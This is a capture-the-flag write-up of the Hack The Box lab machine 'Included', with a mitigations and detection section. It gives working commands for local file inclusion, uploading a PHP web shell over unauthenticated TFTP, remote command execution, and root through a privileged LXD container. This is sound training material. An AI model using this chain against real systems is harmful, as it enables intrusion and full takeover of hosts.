---
machine: Included
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [lfi, tftp, lxd, linux, tier2]
---

# Included — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

LFI in `?file=` on **80/tcp**. Reading `/proc/net/udp` reveals **TFTP (69/udp)**, which has no authentication: upload `shell.php` to `/var/lib/tftpboot` and include it through the LFI. The user is in the **lxd** group, so a privileged container mounts the disk and gives root.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
sudo nmap -sU -p 69 --script tftp-enum <TARGET_IP>
```

```text
80/tcp  http  Apache httpd 2.4.41
69/udp  tftp
```

## Enumeration

```bash
curl -s "http://<TARGET_IP>/?file=/etc/passwd"
```

The parameter includes arbitrary files. To find internal services:

```bash
curl -s "http://<TARGET_IP>/?file=/proc/net/udp"
```

The table shows a socket on port **69** (TFTP), absent from the TCP scan.

## Foothold

TFTP asks for no credentials and writes to `/var/lib/tftpboot`:

```bash
cat > shell.php <<'PHP'
<?php system($_GET['c']); ?>
PHP

tftp <TARGET_IP>
tftp> put shell.php
tftp> quit
```

Include the uploaded file:

```bash
curl -s "http://<TARGET_IP>/?file=/var/lib/tftpboot/shell.php&c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data),lxd
```

## Lateral movement

- The `lxd` group is the path: it allows creating privileged containers.
- Confirm with `id` and `lxc list` (empty, but the socket is reachable).

## Privilege escalation

```bash
# minimal Alpine image
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

```text
# id
uid=0(root)
# cat /mnt/root/root/root.txt
```

Flags: `/home/mike/user.txt` and `/root/root.txt`.

## Evidence

- `/proc/net/udp` with the socket on 69.
- `id` showing the `lxd` group and the flag read from the container.

## Lessons learned

- An LFI does more than read `/etc/passwd`: `/proc` reveals internal services and sockets.
- TFTP is UDP, unauthenticated and writable: direct upload.
- Belonging to `lxd` equals root: a privileged container mounts the host.
- LFI + upload + include turns file read into RCE.

## Mitigations and detection

- Whitelist files in the `file` parameter; never accept user paths.
- Disable TFTP or restrict it to the management network.
- Remove users from the `lxd` group; use `lxc` only from admin accounts.
- Detection: requests with `../` or `/proc/`, TFTP `WRQ` transfers, container creation.

- CWE-98, CWE-434, CWE-269
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1611](https://attack.mitre.org/techniques/T1611/)

## References

- [HackTricks — LXD/LXC privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [HackTricks — TFTP](https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp)
